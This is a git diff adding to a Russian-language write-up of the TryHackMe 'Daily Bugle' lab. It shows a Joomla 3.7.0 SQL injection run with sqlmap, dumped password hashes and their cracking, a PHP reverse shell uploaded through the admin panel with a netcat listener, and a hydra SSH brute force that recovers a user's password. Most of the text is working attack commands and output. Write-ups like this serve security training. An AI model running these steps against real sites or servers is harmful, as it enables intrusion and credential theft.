@@ -51,7 +51,6 @@ Network Distance: 2 hops
 TCP Sequence Prediction: Difficulty=261 (Good luck!)
 IP ID Sequence Generation: All zeros
 ```
-![nmap scan](screenshots/nmap_scan.png)
 
 ### robots.txt
 ```
@@ -92,18 +91,204 @@ Disallow: /tmp/
 
 ## 🕵️ Enumeration
 
->> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+Для версии 3.7.0 Joomla! есть эксплоит sqlmap и есть скрипт python конкретно для выполнения данного ctf
+### sqlmap
+![exploit_db](screenshots/00.exploit-db.png)
+
+Уязвимый параметр `list[fullordering]`
+`http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27`
+
+Предлагаемая команда
+```
+sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+Но `boolean-based blind` и `time-based blind` будут долго обрабатываться, поэтому немного скорректировал команду
+```
+sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE --dbs -p list[fullordering]
+```
+
+В результате нашел 5 баз данных
+```
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+```
+
+**mysql db tables**
+```
+sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE -D mysql --tables -p list[fullordering]
+```
+```
+Database: mysql
+[24 tables]
++---------------------------+
+| event                     |
+| host                      |
+| plugin                    |
+| user                      |
+| columns_priv              |
+| db                        |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| ndb_binlog_index          |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+```
+
+У таблицы `user` 42 колонки, меня интересует `User` `Password`
+```
+Database: mysql
+Table: user
+[6 entries]
++--------+
+| User   |
++--------+
+| root   |
+| root   |
+| root   |
+| root   |
+|
+|
++--------+
+
+Database: mysql
+Table: user
+[6 entries]
++-------------------------------------------+
+| Password                                  |
++-------------------------------------------+
+| *B04E65424026AC47B5626445B67352EBEFD78828 |
+|
+|
+|
+|
+|
++-------------------------------------------+
+```
+
+Делаю дамп таблицы `#__users` из бд `joomla`
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ sqlmap -u "http://10.10.154.91/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=3 --random-agent --dbms=mysql --technique=UE -D joomla -T \#__users --dump -p list[fullordering]
+
+Database: joomla
+Table: #__users
+[1 entry]
++-----+---------------------+------------+---------+--------------------------------------------------------------+----------+
+| id  | email               | name       | params  | password                                                     | username |
++-----+---------------------+------------+---------+--------------------------------------------------------------+----------+
+| 811 | jonah@tryhackme.com | Super User | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
++-----+---------------------+------------+---------+--------------------------------------------------------------+----------+
+```
+
+python exploit также дал имя пользователя и hash
+`>> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`
+
+Далее можно попытаться взломать с помощью hashcat
 ```
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ hashcat -m 3200 -a 0 hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt 
 ```
-$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
+
+Но я, по совету, воспользовался hashes.com
+`$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123`
 
 ## 📂 Получение доступа
 
+Имея логин `jonah` и пароль `spiderman123`, захожу в jommla control panel
+![jommla](screenshots/01.joomla.png)
 
+Загружаю php reverse shell
+![reverse](screenshots/02.reverse.png)
+
+И получаю доступ
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.21.104.16] from (UNKNOWN) [10.10.154.91] 37978
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 00:28:30 up  2:08,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ pwd
+/
+pwd
+sh-4.2$ whoami
+whoami
+apache
+```
 
 ## ⚙️ Привилегии
+
+linPEAS выдал пароль в файлах
+![pass](screenshots/03.pass.png)
+
+И он подошел к ранее найденному хэшуls
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ cat hash_mysql.txt
+*B04E65424026AC47B5626445B67352EBEFD78828
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ cat pass.txt      
+nv5uz9r3ZEDzVjNu
+spiderman123
+                                                                                                                   
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ john --wordlist=./pass.txt hash_mysql.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 SSE2 4x])
+No password hashes left to crack (see FAQ)
+                                                                                                                   
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ john --show hash_mysql.txt               
+?:nv5uz9r3ZEDzVjNu
+
+1 password hash cracked, 0 left
+```
+
+И есть 1 пользователь в /home
+```
+ls -la /home
+total 0
+drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
+dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
+drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
+```
+
+Проверяю креды
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
+└─$ hydra -l jjameson -P ./pass.txt -t 2 ssh://10.10.130.255
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-08 03:43:42
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
+[DATA] attacking ssh://10.10.130.255:22/
+[22][ssh] host: 10.10.130.255   login: jjameson   password: nv5uz9r3ZEDzVjNu
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-08 03:43:48
+```
 
 
 
